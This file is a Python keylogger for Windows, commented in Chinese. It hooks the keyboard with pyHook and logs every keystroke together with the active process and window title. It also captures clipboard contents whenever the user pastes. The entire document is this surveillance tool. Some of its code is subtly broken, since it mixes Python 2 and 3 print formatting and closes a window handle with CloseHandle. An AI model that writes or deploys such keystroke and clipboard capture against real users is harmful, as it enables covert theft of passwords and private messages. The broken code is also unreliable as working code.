from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32=windll.user32 #user32.dll是Windows用户界面相关应用程序接口，用于包括Windows处理，基本用户界面等特性，如创建窗口和发送消息。
kernel32=windll.kernel32  #kernel32控制着系统的内存管理、数据的输入输出操作和中断处理。
psapi=windll.psapi   #pspi是进程状态API
current_window=None
def get_current_process():
	hwnd=user32.GetForegroundWindow()  #获得前台窗口句柄
	pid=c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd,byref(pid))  #获得当前进程ID
	process_id=pid.value
	executable=create_string_buffer("\x00"*512)  #申请内存
	h_process=kernel32.OpenProcess(0x400|0x10,False,pid)
	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512) #获得进程对应可执行文件名
	window_title=create_string_buffer("\x00"*512)
	title=user32.GetWindowTextA(hwnd,byref(window_title),512)  #获得窗口标题
	print ("[PID: %s-%s-%s]") % (process_id,executable.value,window_title.value)  #输出进程和窗口信息
	kernel32.CloseHandle(hwnd)	#关闭句柄
	kernel32.CloseHandle(h_process)
def KeyStroke(event):
	global current_window
	if event.WindowName!=current_window:  #检测是否切换窗口
		current_window=event.WindowName
		get_current_process()
	if event.Ascii>32 and event.Ascii<127: #检测是否为常规按键
		print(chr(event.Ascii))
	else:
		if event.Key=="V": #输入为crtl+V，即粘贴剪切板的内容
			win32clipboard.OpenClipboard() 
			pasted_value=win32clipboard.GetClipboardData() #获取剪切板内容
			win32clipboard.CloseClipboard()
			print ("[PASTE]-%s") % (pasted_value)
		else:
			print ("[%s]") % event.Key
	return True  #返回直到下个钩子函数被触发

if __name__ == '__main__':
	kl=pyHook.HookManager() #创建和注册钩子管理器
	kl.KeyDown=KeyStroke	#将回调函数KeyStroke和KeyDown事件进行绑定
	kl.HookKeyboard()  #注册键盘记录的钩子，然后永久执行
	pythoncom.PumpMessages()
